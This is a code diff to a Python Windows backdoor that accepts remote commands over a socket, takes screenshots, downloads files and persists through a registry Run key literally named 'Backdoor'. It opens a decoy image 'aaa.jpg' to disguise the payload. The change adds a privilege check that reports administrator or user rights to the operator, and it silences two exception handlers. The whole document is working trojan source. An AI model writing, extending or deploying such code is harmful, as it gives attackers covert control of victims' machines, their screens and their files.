@@ -26,6 +26,16 @@ def reliable_recv(sock):
         except ValueError:
             continue
 
+def is_admin(sock):
+    try:
+        temp_dir =os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'),'temp')
+        os.listdir(temp_dir)
+        admin = "[!!] Administrator Privileges"
+    except PermissionError:
+        admin = "[!!] User Privileges"
+    except Exception as e:
+        admin = f"[!!] Ошибка при проверке привилегий: {e}"
+    reliable_send(admin, sock)
 
 def download(url):
     try:
@@ -106,6 +116,8 @@ def shell(sock):
         elif command.startswith("screenshot"):
             screenshot_data = screenshot()
             reliable_send(screenshot_data.decode(), sock)
+        elif command.startswith("check"):
+            is_admin(sock)
         else:
             execute_command(sock, command)
 
@@ -134,7 +146,7 @@ def setup_autorun():
                 winreg.KEY_SET_VALUE,
             ) as key:
                 winreg.SetValueEx(key, "Backdoor", 0, winreg.REG_SZ, location)
-        except Exception as e:
+        except:
             pass
         if hasattr(sys, "_MEIPASS"):
             image_path = os.path.join(sys._MEIPASS, "aaa.jpg")
@@ -142,7 +154,7 @@ def setup_autorun():
             image_path = "aaa.jpg"
         try:
             subprocess.Popen(["start", image_path], shell=True)
-        except Exception as e:
+        except:
             pass
 
 
